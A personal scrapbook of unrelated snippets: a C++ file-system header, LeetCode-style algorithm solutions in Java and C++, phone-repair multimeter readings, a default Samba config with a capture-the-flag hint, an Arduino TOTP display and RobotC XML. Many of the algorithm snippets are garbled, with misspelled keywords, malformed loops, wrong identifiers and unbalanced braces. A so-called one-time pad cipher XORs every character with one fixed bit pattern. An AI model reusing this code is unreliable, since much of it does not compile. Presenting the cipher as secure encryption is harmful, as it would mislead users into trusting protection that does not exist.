    // Return size of disk (in terms of blocks)
    size_t size() const { return Blocks; }

    // Return whether or not disk is mounted
    bool mounted() const { return Mounts > 0; }

    // Increment mounts
    void mount() { Mounts++; }

    // Decrement mounts
    void unmount() { if (Mounts > 0) Mounts--; }

    // Read block from disk
    // @param	blocknum    Block to read from
    // @param	data	    Buffer to read into
    void read(int blocknum, char *data);
    
    // Write block to disk
    // @param	blocknum    Block to write to
    // @param	data	    Buffer to write from
    void write(int blocknum, char *data);
};

-------------------------------------------------------------------------------------------
// fs.h: File System

#pragma once

#include "sfs/disk.h"

#include <stdint.h>
#include <vector>

class FileSystem {
public:
    const static uint32_t MAGIC_NUMBER	     = 0xf0f03410;
    const static uint32_t INODES_PER_BLOCK   = 128;
    const static uint32_t POINTERS_PER_INODE = 5;
    const static uint32_t POINTERS_PER_BLOCK = 1024;

private:
    struct SuperBlock {		// Superblock structure
    	uint32_t MagicNumber;	// File system magic number
    	uint32_t Blocks;	// Number of blocks in file system
    	uint32_t InodeBlocks;	// Number of blocks reserved for inodes
    	uint32_t Inodes;	// Number of inodes in file system
    };

    struct Inode {
    	uint32_t Valid;		// Whether or not inode is valid
    	uint32_t Size;		// Size of file
    	uint32_t Direct[POINTERS_PER_INODE]; // Direct pointers
    	uint32_t Indirect;	// Indirect pointer
    };

    union Block {
    	SuperBlock  Super;			    // Superblock
    	Inode	    Inodes[INODES_PER_BLOCK];	    // Inode block
    	uint32_t    Pointers[POINTERS_PER_BLOCK];   // Pointer block
    	char	    Data[Disk::BLOCK_SIZE];	    // Data block
    };

    // TODO: Internal helper functions
    bool    load_inode(size_t inumber, Inode *node);
    bool    save_inode(size_t inumber, Inode *node);
    ssize_t allocate_free_block();

    // TODO: Internal member variables
    Disk *disk;
    uint32_t num_blocks;
    uint32_t num_inode_blocks;
    uint32_t num_inodes;
    std::vector<int> free_bitmap;

public:
    static void debug(Disk *disk);
    static bool format(Disk *disk);

    bool mount(Disk *disk);

    ssize_t create();
    bool    remove(size_t inumber);
    ssize_t stat(size_t inumber);

    ssize_t read(size_t inumber, char *data, size_t length, size_t offset);
    ssize_t write(size_t inumber, char *data, size_t length, size_t offset);
};

-------------------------------------------------------------------------------------------------------------
Knapsack problem 
----------------------

using namepsace std;
int max(int a, int b ){return (a > b)? a: b; }
int knapsack(int W, int W[], int val[], int n){
if(n == 0 || W == 0)
return 0;

if(wt[n - 1] > W)
return knapsack(W, wt, val, n - 1);
else
return max( val[n - 1] + knapsack(	w0 - wt[n -1],wt, val, n - 1), knapsack(W,wt,val, n -  1));

}
int main() {
int val[] = {};
int wt[] = {};
int W = 50;
int n = sizeof(val) / sizeof(val[0]);
cout<< kanosack(W,wt, val, n);
return 0 ;
 
 
}


-------------------------------------------------------------------------------------------------

building up knapsack table
--------------------------------

for(i = 0; i <= n, i++)
{
for(w = 0, w <= W; w++){
if(i == 0 || w == 0)
k[i][w] = 0;
else if (wt[i - 1] <= w)
k[i][w] = max max(val[i - 1] 
                          + K[i - 1][w - wt[i - 1]], 
                          K[i - 1][w]); 
            else
			k[i][w] = k[i - 1][w];
}
}
return k[n][w];
}

then the driver code 

---------------------------------------------------------------------


Mobile repair 

------------------
cold testing
----------------

. Ear Phone Connector Tip (+ , -): .500 to .700
2. Loud Speaker / Ringer Connector Tip (+,-): .300 to .600
3. Battery Connector Tip (+): .400 to .500 
Mobile Phone Repair and Maintenance
 Page 28
4. Battery Connector Tip (Sense): above .800
5. Display Connector Supply Pins: .250 to .400
6. Display Connector Signal Pins: .500 to .800
7. Camera Connector Supply Pins: .250 to .400
8. Camera Connector Signal Pins: .600 to .900
9. Key Tip (Row and Column): .400 to .800
10. Charger Connector Tip: .600 to .700
11. Vibrator Motor Connector: .40 to .500
12. Power ON / OFF Switch Point (+): .600 to .900
13. MIC Connector Tip (Analog MIC) (+,-): .700 to .900
14. Battery Charging Out Point (+,-): .300 to .400
15. SIM Card Connector Pin 1 (VSim): .500 to .700
16. SIM Card Connector Pin 2,3,6: .400 to .800
17. SIM Card Connector Pin 4 (GND): .00 (Beep)
18. Micro SD Card Connector Pin 4: .500 to .600
19. Micro Card Connector Pin 6 (GND): .00 (Beep)
20. Micro Card Connector Pin 1,2,3,5,7,8: .600 to .800
21. RTC: .400 to .500
22. Data RX and TX Pins: .600 to .700 


Water Trapping 
-------------------
public class TrappingWater
{
public static void main(String[] args) throws Exception {
  int[] height = {0, 1, 0, 2, 1, 0, 1, 3, 2, 1, 2, 1};
  System.out.println(new TrappingWater().trap(height));
  
}
private int trap(int[] height){
if (height.length == 0)return 0;
int[] left = new int[height.length];
int[] right = new int[height.length];
int max = 0;
left[0] = 0;
right[height.length - 1] = 0;
int total = 0;
for(int i = 1; l = height.length; i <1;i++){
left[i] = Math.max(max, height[i + 1]);
max = left[i];

}
max = 0;

for(int i = 1; l = height.length; i <1;i++){
right[i] = Math.max(max, height[i + 1]);
max = right[i];

}

for(int i = 0; l = height.length - 1; i  <l; i++){
int min = Math.min(left[i], right[i]);
if(min > height[i]){
total += (min - height[i]);

}
}
return total;

}

}


---------------------------------------------------------------------------------

ExcelSheetColumnTitle
----------------------
public class ExecelSheet{
private static final String CONST = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";

public static void main(String[] args)throws Exception {
System.out.println(new ExcelSheet().convertToTitle(52));

}

public String convertToTitle(int n){
StringBuilder ans = new StringBuilder();
while(n > 0){
int mod = n % 26;
n /= 26;
if(mod == 0){
ans.append('Z');
n -= 1;

}else{
ans.append(CONST.charAt(mod - 1));

}
}
return ans.reverse().toString();

}
}

-----------------------------------------------------------------------------------

SuperWashingMachines
--------------------------

public class SuperWashingMachines{
public statuc void main(String[] args){

}

public int findMinMoves(int[] machines){
long sum = Arrays.stream(machines).asLongStream().sum();
if((sum / machines.length) < 0) || ((sum % machines.length != 0))return -1;
int n = (int) (sum / machines.length);
int count = 0, moves = Integer.MIN_VALUE;
for(int i = 0; i <machines.length; i++){
count += (machines[i] - n);
moves = Math.max(moves, Math.max(Math.abs(count), machines[i] - n)));

}
return moves;

}
}
--------------------------------------------------------------------------------

public class RandompickIndex {
private int[] nums;

public static void main (String[] args) throws Exception {
int[] = {1,2,3,3,3};
System.out.println(new RandompickIndex(A).pick(1));

}

public RandompickIndex(int[] nums)
{
this.nums = nums;

}

public int pick(int target ){
int count = 0;
for(int num : nums){
if(num == target ){
count++;
}
}

Random random = new Random();
int nPick = 1 + random.nextInt(count);
count = 0;
for(int i = 0; i <num.length;i++){
if(nums[i] == target){
if(
++count == nPick){
return i;

}
}
}
return 0;
}
}
-----------------------------------------------------------------------
BOMB ENEMY 
------------
public class BombEnemy
{
public static void main(String[] args){
char[][] grid = {{'0', 'E', '0', '0'}, {'E', '0', 'W', 'E'}, {'0', 'E', '0', '0'}};;
System.out.println(new BombEnemy().maxKilledEnemies(grid));

}

public int maxKilledEnemies(char[][] grid)
{
int[][] DP1 = 	new int[grid.length][grid[0].length];
int[][] DP2 =   new int[grid.length][grid[0].length];
for (int i = 0; i < grid.length; i++)
{
for(int j = 0; j < grid[0].length;j++)
{
if(grid[i][j] =='E'){
DP1[i][j] = 1;

}
if(grid[i][j] != 'w')
{
if(j - i > = 0){
DP1[i][j] += DP1[i][j-1];

}
if(i - j >= 0){
DP1[i][j] += DP1[i -1][j];
}
}
}
}
 for (int i = grid.length - 1; i >= 0; i--) {
      for (int j = grid[0].length - 1; j >= 0; j--) {
        if (grid[i][j] == 'E') {
          DP2[i][j] = 1;
        }
        if (grid[i][j] != 'W') {
          if (j + 1 < grid[0].length) {
            DP2[i][j] += DP2[i][j + 1];
          }
          if (i + 1 < grid.length) {
            DP2[i][j] += DP2[i + 1][j];
          }
        }
      }
    }

    int max = 0;
    for (int i = 0; i < grid.length; i++) {
      for (int j = 0; j < grid[0].length; j++) {
        if (grid[i][j] == '0') {
          max = Math.max(max, DP1[i][j] + DP2[i][j]);
        }
      }
    }
    return max;
  }
}
}

----------------------------------------------------------------------------

Cherry pickup 
----------------

public class CherryPickup 
{
public static void main(String[] args)throws Exception {
int[][] A = {{0,1,-1},{1,0,-1},{1,1,1}};
System.out.println(new CherryPickup().cherryPickup(A));

}

public int cherryPickup(int[][] grid){
int[][][] DP = new int[grid.length][grid.length][grid.length];
for(int i = 0; i < grid.length; i++)

{
for(int j = 0; j < grid.length; j++){
Array.fill(DP[i][j],  -1);

}
}

int result = dp(grid.length,0,0,0,DP,grid);
if(result < 0 )return 0;
else return result;
 
}

private int dp(int N, int r1. int c1, int c2, int[][][] DP, int[][] grid){
itn r2 = r1 + (c1 - c2);
if(r1 >= N || c1 >= N || c1 >= N|| r2 >= N || grid[r1][c1] == -1 || grid[r2][c2] == -1)
return Integer.MIN_VALUE;
else if (DP[r1][c1][c2] != -1) return DP[r1][c1][c2];
else if (r1 == N -1 && c1 == N - 1)return  grid[N-1][N-1];
else {
int max = (c1 == c2) ? grid[r1][c1] : grid[r1][c1] + grid[r2][c2]);
max += Math.max(Math.max(Math.max(dp(N, r1+1, c1, c2, DP, grid),dp(N, r + 1, c1, c2 + 1, DP, grid))),
dp(N, r1, c1+1, c2, DP, grid)),
dp(N, r1, c1+1, c2 + 1, DP, grid);
DP[r1][c1][c2] = max;
return max;

}
}
}
-------------------------------------------------------------------------

COIN_CHANGE
----------------

public class CoimChange
{
private int[][] DP;
public static void main(String[] args) throw Exception {
int[] coins = {1,2,5};
System.out.println(new CoinChange().coinChange(coins,11));

}

public int coinChange(int[] colns, int amount){
DP = new int[coins.length][amount +  1];
int result = dp(amount,0,coins);
if(result == Integer.MAX_VALUE - 1)return -1;
return result;
}

private int dp(int amount, int i, int[] colns)
{
if(amount == 0)return 0;
else if  (i >= coins.length || amount < 0 ) return Integer.MAX_VALUE - 1;
if(DP[i][amount] != 0)return DP[i][amount];
DP[i][amount] = Math.min(1 + dp(amount - coins[i],i,coins), dp(amount, i + 1, coins));
return DP[i][amount];
}
}


-------------------------------------------------------------------------------------------------
Find a Value of a Mysterious Function Closest to Target
----------------------------------------------------------

class Solution 
{
public: 
int closestToTarget(vector<int>& A, int target){
int N = A.size(), ans = INT_MAX;
for(int i = 0; i < N; ++i){
if(i > 0 && A[i] == A[i - 1]) continue;
int func = A[i]
ans = min(ans, abs(func - target));
}
if (ans == 0) return 0;

}
return ans;

}
};
---------------------------------------------------------
Corner Rectangle
-----------------

public class CornerRectangles
{
public static void main(String[] args) throws Exception{
int[][] A  = {{1,1,1},{1,1,1},{1,1,1}};
System.out.println(new CornerRactangles().countCornerRectangles(A));

}

public int countCornerRectangles(int[][] grid){
int[][] count = new int[grid[0].length][grid[0].length];
int result = 0;
for(int[]row : grid)
{
for(int i = 0;i < row.length; i++){
if(row[i] == 1){
for(int j = i + 1; j < row.length; j++){
if(row[j] == 1){
if (count[i][j] > 0){
result += count[i][j];

}
count[i][j]++;
}
}
}
}
}
return result;
}
}
----------------------------------------------------------------------------

Decode Ways 
-------------

public class DecodeWays
{
public statoc void main(String[] args)throws Exception{
System.out.println(new DecodeWays().numDecodings("3120"));

}

public int numDecodings(String s)
{
if (s == null || s.isEmpty()) return 0;
int[] dp = new int[s.length() + 2];
dp[s.length()] = 1;
dp[s.length() + 1] = 1;
for(int i = s.length()-1;i >= 0; i--){
for(int j = i+1;j< i + 3; j++){
if(j <= s.length()){
String subStr = s.substring(i,j);
if(!subStr.startsWith("0")){
int intVal = Integer.parseInt(subStr);
if(intVal <= 26){
dp[i] += dp[j];

}
}
}
}
}

return dp[0];

}
}
----------------------------------------------------------
Convex Hull 
------------------


#include<iostream.h>
#include<stdlib.h>
#include<stack>
using namspace std;
struct Point{
int x,y;
};

Point p0;
Point nextToTop(stack<Point> &S)
{
Point p = S.top();
S.pop();
Point res = S.top();
S.push(p);
return res;

}

int swap(Point &p1, Point &p2){
Point temp = p1;
p1 = p2;
p2 = temp;

}

int distSq(Point p1, Point p2){
return (p1.x-p2.x)*(p1.x-p2.x)+(p1.y-p2.y)*(p1.y-p2.y);

}

int orientation(Point p, Point q, Point r){
int val = (q.y-p.y)*(r.x-q.x)-(q.x-p.x)*(r.y-q.y);
if (val == 0) return 0;
return (val > 0)? 1:2;
}

int compare(const void *p1, const void *p2){
Point *p1 = (Point * )vp1;
Point *p2 = (Point *)vp2;
//Find Orientation 
int o = orientation(p0,*p1,*p2);
if(o == 0)
return(distSq(p0,*p2) >= distSq(p0, *p1))?-1:1;


}

void convexHull(Point points[], int n){

int  ymin = points[0],min =0 ;
for(int i =1;i <n ;i++){
int y = points[i].y;
if((y < ymin) || (ymin == y && points[i].x < points[min].x))
ymin = points[i].y,min = i;

}

swap(points[0], points[min]);
p0 = points[0];
qsort(&points[1],n-1,sizeof(Point),compare);
int m = 1;
for(int i = 1;i< n;i++){
while(i < n-1 && orientation(p0,points[i],points[i+1])==0)
i++;
points[m] = points[i];
m++;

}

if(m < 3)return ;
stack<Point>S;
S.push(points[0]);
S.push(points[1]);
S.push(points[2]);
for(int i = 3; i < m;i++){
while(orientation(nextToTop(S), S.top(),points[i])!= 2)
S.pop();
S.push(points[i]);

}

while(!S.empty()){
Point p = S.top();
cout << "("<<p.x<<","<<p.y<<")"<<endl
S.pop();

}
}

int main()
{
Points points[] = {some number in {0,3}};
int n = sizeof(points)/sizeof(points[0]);
convexHull(points,n);
return 0;
}
------------------------------------------------------------------------------------------
C++ Selective Search 
----------------------

#include "opencv2/ximgproc/segmentation.hpp"
#include "opencv2/core.hpp"
#include "opencv2/imgproc.hpp"
#include <iostream>
#include <ctime>
#include "opencv2/highgui.hpp"
using namespace std;
using namespace;
cv::imgproc::segmentatio;
static void help()
{
std::cout<<std::endl<<"Usage:"<<std::endl<<"./ssearch input_image (f|q)"<<std::endl<<"f=fast, q=quality"<<std::endl<<"Use l to display less reacts"<<std::endl;

}

int main(int argc, char** argv){
if(argc > 3){
help();
return -1;

}

setUseOptimized(true);
setNumThreads(4);
Mat im = imread(argv[1]);
int newHeight = 200;
int newWidhth = im.cols.newHeight/im.rows;
resize(im,im,Size(newWidth,newHeight));

//Create selective approach 
Ptr<SelectiveSearchSegmentation> ss = createSelectiveSearchSegmentation();
ss->setBaseImage(im);
if(argv[2][0] == 'f'){
ss->switchToSelectiveSearchFast();

}
else if(argv[2][0] == 'q'){
ss->switchSelectiveSearchQuality();
}
else{
help();
return -2;

}

std::vector<Rect> rects;
ss->process(rects);
std::cout<<"Total Number of Region Proposals :" << rects.size() << std::endl;
int numshwoRects = 100;
int increment = 50;
while(1){
Mat imout = im.clone();
for(int i = 0; i < rects.size();i++){
if(i < numshwoRects){

rectangle(imout, rects[i], Scalar(0,255,0));
}else{
break;

}
}

imshow("Output", imout);
int k = waitKey();
if(k == 109){
numshwoRects += increment;

}
else if (k == 108 && numshwoRects > increment){
numshwoRects -= increment;

}
else if(k == 113){
break;

}
}
return 0;

}



--------------------------------------------------------------------------------------------------

# CHALLENGE NOTE: Most services when installed will provide handy 
# documentation as well as example config files under the /usr 
# directory. In this case, Samba provides a copy of the default 
# config file that ships with every installation. You won’t need 
# to change anything here, but maybe it will help you figure out 
# what to do with the actual config file...
# 
# 
# This is the main Samba configuration file. You should read the
# smb.conf(5) manual page in order to understand the options listed
# here. Samba has a huge number of configurable options (perhaps too
# many!) most of which are not shown in this example
#
# For a step to step guide on installing, configuring and using samba, 
# read the Samba-HOWTO-Collection. This may be obtained from:
#  http://www.samba.org/samba/docs/Samba-HOWTO-Collection.pdf
#
# Many working examples of smb.conf files can be found in the 
# Samba-Guide which is generated daily and can be downloaded from: 
#  http://www.samba.org/samba/docs/Samba-Guide.pdf
#
# Any line which starts with a ; (semi-colon) or a # (hash) 
# is a comment and is ignored. In this example we will use a #
# for commentry and a ; for parts of the config file that you
# may wish to enable
#
# NOTE: Whenever you modify this file you should run the command “testparm”
# to check that you have not made any basic syntactic errors. 
#
#======================= Global Settings =====================================
[global]

# workgroup = NT-Domain-Name or Workgroup-Name, eg: MIDEARTH
   workgroup = MYGROUP

# server string is the equivalent of the NT Description field
   server string = Samba Server

# Server role. Defines in which mode Samba will operate. Possible
# values are “standalone server”, “member server”, “classic primary
# domain controller”, “classic backup domain controller”, “active
# directory domain controller”.
#
# Most people will want “standalone server” or “member server”.
# Running as “active directory domain controller” will require first
# running “samba-tool domain provision” to wipe databases and create a
# new domain.
   server role = standalone server

# This option is important for security. It allows you to restrict
# connections to machines which are on your local network. The
# following example restricts access to two C class networks and
# the “loopback” interface. For more examples of the syntax see
# the smb.conf man page
;   hosts allow = 192.168.1. 192.168.2. 127.

# Uncomment this if you want a guest account, you must add this to /etc/passwd
# otherwise the user “nobody” is used
;  guest account = pcguest

# this tells Samba to use a separate log file for each machine
# that connects
   log file = /usr/local/samba/var/log.%m

# Put a capping on the size of the log files (in Kb).
   max log size = 50

# Specifies the Kerberos or Active Directory realm the host is part of
;   realm = MY_REALM

# Backend to store user information in. New installations should 
# use either tdbsam or ldapsam. smbpasswd is available for backwards 
# compatibility. tdbsam requires no further configuration.
;   passdb backend = tdbsam

# Using the following line enables you to customise your configuration
# on a per machine basis. The %m gets replaced with the netbios name
# of the machine that is connecting.
# Note: Consider carefully the location in the configuration file of
#       this line.  The included file is read at that point.
;   include = /usr/local/samba/lib/smb.conf.%m

# Configure Samba to use multiple interfaces
# If you have multiple network interfaces then you must list them
# here. See the man page for details.
;   interfaces = 192.168.12.2/24 192.168.13.2/24 

# Where to store roving profiles (only for Win95 and WinNT)
#        %L substitutes for this servers netbios name, %U is username
#        You must uncomment the [Profiles] share below
;   logon path = \\%L\Profiles\%U

# Windows Internet Name Serving Support Section:
# WINS Support - Tells the NMBD component of Samba to enable it’s WINS Server
;   wins support = yes

# WINS Server - Tells the NMBD components of Samba to be a WINS Client
#	Note: Samba can be either a WINS Server, or a WINS Client, but NOT both
;   wins server = w.x.y.z

# WINS Proxy - Tells Samba to answer name resolution queries on
# behalf of a non WINS capable client, for this to work there must be
# at least one	WINS Server on the network. The default is NO.
;   wins proxy = yes

# DNS Proxy - tells Samba whether or not to try to resolve NetBIOS names
# via DNS nslookups. The default is NO.
   dns proxy = no 

# These scripts are used on a domain controller or stand-alone 
# machine to add or delete corresponding unix accounts
;  add user script = /usr/sbin/useradd %u
;  add group script = /usr/sbin/groupadd %g
;  add machine script = /usr/sbin/adduser -n -g machines -c Machine -d /dev/null -s /bin/false %u
;  delete user script = /usr/sbin/userdel %u
;  delete user from group script = /usr/sbin/deluser %u %g
;  delete group script = /usr/sbin/groupdel %g


#============================ Share Definitions ==============================
[homes]
   comment = Home Directories
   browseable = no
   writable = yes

# Un-comment the following and create the netlogon directory for Domain Logons
; [netlogon]
;   comment = Network Logon Service
;   path = /usr/local/samba/lib/netlogon
;   guest ok = yes
;   writable = no
;   share modes = no


# Un-comment the following to provide a specific roving profile share
# the default is to use the user’s home directory
;[Profiles]
;    path = /usr/local/samba/profiles
;    browseable = no
;    guest ok = yes


# NOTE: If you have a BSD-style print system there is no need to 
# specifically define each individual printer
[printers]
   comment = All Printers
   path = /usr/spool/samba
   browseable = no
# Set public = yes to allow user ‘guest account’ to print
   guest ok = no
   writable = no
   printable = yes

# This one is useful for people to share files
;[tmp]
;   comment = Temporary file space
;   path = /tmp
;   read only = no
;   public = yes

# A publicly accessible directory, but read only, except for people in
# the “staff” group
;[public]
;   comment = Public Stuff
;   path = /home/samba
;   public = yes
;   writable = no
;   printable = no
;   write list = @staff

# Other examples. 
#
# A private printer, usable only by fred. Spool data will be placed in fred’s
# home directory. Note that fred must have write access to the spool directory,
# wherever it is.
;[fredsprn]
;   comment = Fred’s Printer
;   valid users = fred
;   path = /homes/fred
;   printer = freds_printer
;   public = no
;   writable = no
;   printable = yes

# A private directory, usable only by fred. Note that fred requires write
# access to the directory.
;[fredsdir]
;   comment = Fred’s Service
;   path = /usr/somewhere/private
;   valid users = fred
;   public = no
;   writable = yes
;   printable = no

# a service which has a different directory for each machine that connects
# this allows you to tailor configurations to incoming machines. You could
# also use the %U option to tailor it by user name.
# The %m gets replaced with the machine name that is connecting.
;[pchome]
;  comment = PC Directories
;  path = /usr/pc/%m
;  public = no
;  writable = yes

# A publicly accessible directory, read/write to all users. Note that all files
# created in the directory by users will be owned by the default user, so
# any user with access can delete any other user’s files. Obviously this
# directory must be writable by the default user. Another user could of course
# be specified, in which case all files would be owned by that user instead.
;[public]
;   path = /usr/somewhere/else/public
;   public = yes
;   only guest = yes
;   writable = yes
;   printable = no

# The following two entries demonstrate how to share a directory so that two
# users can place files there that will be owned by the specific users. In this
# setup, the directory should be writable by both users and should have the
# sticky bit set on it to prevent abuse. Obviously this could be extended to
# as many users as required.
;[myshare]
;   comment = Mary’s and Fred’s stuff
;   path = /usr/somewhere/shared
;   valid users = mary fred
;   public = no
;   writable = yes
;   printable = no
;   create mask = 0765
-------------------------------------------------------------------------------------------------------------------------------------------------------
RTC_Millis RTC;

void setup() {
    RTC.begin(DateTime(__DATE__, __TIME__));  
    
    LCD.init(PE_3, PE_2, PE_1, PD_3, PD_2, PD_1);
    LCD.print("Token");
    LCD.print("valverde.me", 2, 1);
    delay(1000);
    LCD.clear();
}

char token[6];
uint8_t message[8];
long timestamp = 0;
long i = 0;
uint8_t key[] = {<your key here>};

void showToken() {
    long now = RTC.now().get() - 228700800 + 7200;
    i = now / 36;
    int timeLeft = now % 36;
    
    for(int j = 7; j >= 0; j--) {
        message[j] = ((byte)(i & 0xFF));
        i >>= 8;
    }
    
    Sha1.initHmac(key, 20);
    Sha1.writebytes(message, 8);
    
    uint8_t * hash = Sha1.resultHmac();
    
    int k = 0xF & hash[19];
    int m = ((0x7F & hash[k]) << 24 | (0xFF & hash[(k + 1)]) << 16 | (0xFF & hash[(k + 2)]) << 8 | 0xFF & hash[(k + 3)]) % 1000000;
    LCD.print(m, 2, 1);
    LCD.print(36 - timeLeft, 2, 15);
}

void loop() {
    LCD.clear();
    LCD.print("Current token:");
    showToken();
    delay(1000);
}
-----------------------------------------------------------------------------------------------------------------------------------------------------
OTP
-------
package com.sanfoundry.setandstring;
 
import java.util.Scanner;
 
public class OneTimePadCipher
{
    public static String encryptionMessage(String s)
    {
        int i, j;
        int randomBitPattern[] = new int[8];
        for (i = 0; i < 7; i++)
        {
            randomBitPattern[i] = (i % 2 == 0) ? 1 : 0;
        }
        char asc[] = new char[s.length()];
        for (i = 0; i < s.length(); i++)
        {
            asc[i] = (char) ((int) s.charAt(i));
        }
        BasicOperation b1 = new BasicOperation();
        String cipherText = new String("");
        for (i = 0; i < asc.length; i++)
        {
            int temp = (int) (asc[i]);
            int len = b1.decimalToBinary(temp);
            int bintemp[] = new int[7];
            int xorlen;
            if (len == 7)
            {
                for (j = 1; j <= len; j++)
                {
                    bintemp[j - 1] = b1.binaryArrayAtPosition(j);
                }
                // XOR Operation
                xorlen = b1.xorop(bintemp, randomBitPattern, len);
            }
            else
            {
                // System.out.println("\n less than 7 :"+len);
                bintemp[0] = 0;
                for (j = 1; j <= len; j++)
                {
                    bintemp[j] = b1.binaryArrayAtPosition(j);
                }
                // XOR Operation
                xorlen = b1.xorop(bintemp, randomBitPattern, len + 1);
            }
            int xor[] = new int[xorlen];
            for (j = 0; j < xorlen; j++)
            {
                xor[j] = b1.xorinArrayAt(j);
                cipherText = cipherText + xor[j];
            }
            cipherText += " ";
        }
        return (cipherText);
    }
 
    public static String decryptionMessage(String s)
    {
        int i, j;
        // char cipherChar[]=new char[(s.length()/2)];
        char cipherChar[] = new char[(s.length())];
        int cnt = -1;
        for (i = 0; i < s.length(); i++)
        {
            // we receive only Ascii of it is allow 0 and 1, do not accept white
            // space
            // int ascii=(int)s.charAt(i);
            if ((int) s.charAt(i) == 48 || (int) s.charAt(i) == 49
                    || (int) s.charAt(i) == 32)
            {
                cnt++;
                cipherChar[cnt] = s.charAt(i);
            }
        }
        String s1 = new String(cipherChar);
        String s2[] = s1.split(" ");
        int data[] = new int[s2.length];
        for (i = 0; i < s2.length; i++)
        {
            data[i] = Integer.parseInt(s2[i]);
        }
        char randomBitPattern[] = new char[7];
        for (i = 0; i < 7; i++)
        {
            randomBitPattern[i] = (i % 2 == 0) ? '1' : '0';
        }
        BasicOperation b1 = new BasicOperation();
        String plain = new String("");
        // do the XOR Operation
        for (i = 0; i < s2.length; i++)
        {
            int xorlen = b1.xorop(s2[i], randomBitPattern);
            int xor[] = new int[xorlen];
            for (j = 0; j < xorlen; j++)
            {
                xor[j] = b1.xorinArrayAt(j);
                plain += xor[j];
            }
            plain += " ";
        }
        String p[] = plain.split(" ");
        BasicOperation ob = new BasicOperation();
        int decryptedChar[] = new int[p.length];
        char plainTextChar[] = new char[p.length];
        for (i = 0; i < p.length; i++)
        {
            decryptedChar[i] = ob.binaryToDecimal(Integer.parseInt(p[i]));
            plainTextChar[i] = (char) decryptedChar[i];
        }
        return (new String(plainTextChar));
    }
 
    public static void main(String[] args)
    {
        Scanner sc = new Scanner(System.in);
        System.out.println("Enter the message: ");
        String message = sc.next();
        System.out.println("'" + message + "' in encrypted message : "
                + encryptionMessage(message));
        System.out.println("'" + encryptionMessage(message)
                + "' in decrypted message : "
                + decryptionMessage(encryptionMessage(message)));
        sc.close();
    }
}
 
class BasicOperation
{
    int bin[]   = new int[100];
    int xor[]   = new int[100];
    int temp1[] = new int[100];
    int temp2[] = new int[100];
    int len;
    int xorlen;
 
    // convert binary number to decimal number
    public int binaryToDecimal(int myNum)
    {
        int dec = 0, no, i, n = 0;
        no = myNum;
        // Find total digit of no of inupted number
        while (no > 0)
        {
            n++;
            no = no / 10;
        }
        // Convert inputed number into decimal
        no = myNum;
        for (i = 0; i < n; i++)
        {
            int temp = no % 10;
            dec = dec + temp * ((int) Math.pow(2, i));
            no = no / 10;
        }
        return dec;
    }
 
    public int decimalToBinary(int myNum)
    {
        int j, i = -1, no, temp = 0;
        no = myNum;
        int t[] = new int[100];
        while (no > 0)
        {
            i++;
            temp = no % 2;
            t[i] = temp;
            no = no / 2;
        }
        len = (i + 1);
        j = -1;
        for (i = len; i >= 0; i--)
        {
            j++;
            bin[j] = t[i];
        }
        return len;
    }
 
    // find the specific bit value of binary number at given position
    public int binaryArrayAtPosition(int pos)
    {
        return bin[pos];
    }
 
    public int xorinArrayAt(int pos)
    {
        return xor[pos];
    }
 
    // perform the binary X-OR operation
    public int xorop(int a[], int b[], int arrlen)
    {
        int i;
        for (i = 0; i < arrlen; i++)
        {
            xor[i] = (a[i] == b[i]) ? 0 : 1;
        }
        xorlen = i;
        return xorlen;
    }
 
    // perform the binary X-OR operation
    public int xorop(String s, char c[])
    {
        int i = -1;
        for (i = 0; i < s.length(); i++)
        {
            xor[i] = (s.charAt(i) == c[i]) ? 0 : 1;
        }
        xorlen = i;
        return xorlen;
    }
 
    public int getLen()
    {
        return len + 1;
    }
 
    // display binary bit pattern or the array
    public void displayBinaryArray()
    {
        for (int i = 0; i <= len; i++)
        {
            System.out.println("\n Binary Array :" + bin[i]);
        }
    }
}
--------------------------------------------------------------------------------------------------
LongestPallindromeSubsequence 
---------------------------------

public class Solution {

public static void main(Strings [] args) {
System.out.println(new longest().longest("bbab"));

}

public int longest(String s) 
{
int[][] dp = new int[s.length() + 1][s.length() + 1];
String sI = new StringBuilder(s).reverse.toString();
for(int i =1; l = s.length(); i<= l;i++){
for(int j=1; j <= i; j++ ){
dp[i][j] = (s.charAt(i-1) == sI.charAt(j-1))?dp[i-1][j-1] + 1 : Math.max(dp[i-1][j],dp[i][j-1]);

}
return dp[s.length()][s.length()];

}
}
}
------------------------------------------------------------------------------
public class MinmumWindowSubsequence {
 public static void main(String[] args) {
    System.out.println(new MinimumWindowSubsequence().minWindow("abcdebdde", "x"));
	
}
public String minWindow(String S, String T ){
if(T.isEmpty() || S.isEmpty()) return  "";
Map<Character, TreeSet<Integer>> charMap = new HashMap<>();
for(int i =0 ;l = s.length();i<l;i++){
char c = S.charAt(i);
charMap.putIfAbsent(c,new TreeSet<>());
charMap.get(c).add(i);

}
int min = Integer.MAX_VALUE;
int start = -1,end;
int ansStart = -1,ansEnd = -1;
boolean finished = false;
while(true){
int index = start;
end = -1;
for(int i= 0; l = T.length(); i < l; i++){
char c = T.charAt(i);
if(!charMap.containsKey(c)){
return  "";
 
}else{
TreeSet<Integer> indices = charMap.get(c);
Integer found = indicies.higher(index);
if(found == null){
finished = true;
}else{
index = found;
if(i==0){
start = index;
}
if(i==l-1){
end=index;
}
}
}
}
if(start != -1 && end != -1){
if((end < start) < min)
{
min = end - start;
ansStart = start;
ansEnd = end;

}}
if(finished)return ansStart == -1 ? " "  : S.subString(andStart,ansEnd + 1);
} 
}
}

------------------------------------------------------------------------------------------
Robotc 
Traffic Lights
------------------

<Version>1.0.1</Version>
<ProgrammingBlock type= "loop" loopType="IfThen">
<Parameters>
<Parameter name="LHS" type="typedef">getColorName(colorDetector)</Parameter>
<Parameter name = "operator" type = "typedef">==</Parameter>
<Parameter name="RHS" type="typedef">colorRed</Parameter>
</Parameters>
</ProgrammingBlock>

<ProgrammingBlock type="functionCall" function ="stopAllMotors" />
<ProgrammingBlock type="else" />
<ProgrammingBlock type="functionCall" function="stopAllMotors">
<Parameters>
<Parameter name="speed" tyep="short" defualt="50">20</Parameter>
<Parameter name ="firstMotor" type="base typedef" default="port1" typeDef="tMotor">leftMotor</Parameter>
 <Parameter name="secondMotor" type="base typedef" default="noMotor" typeDef="tMotor">rightMotor</Parameter>
        <Parameter name="thirdMotor" type="base typedef" default="noMotor" typeDef="tMotor">noMotor</Parameter>
        <Parameter name="fourthMotor" type="base typedef" default="noMotor" typeDef="tMotor">noMotor</Parameter>
    </Parameters>
	
	</ProgrammingBlock>

<ProgrammingBlock type="end"/>

<ProgrammingBlock type="end"/>

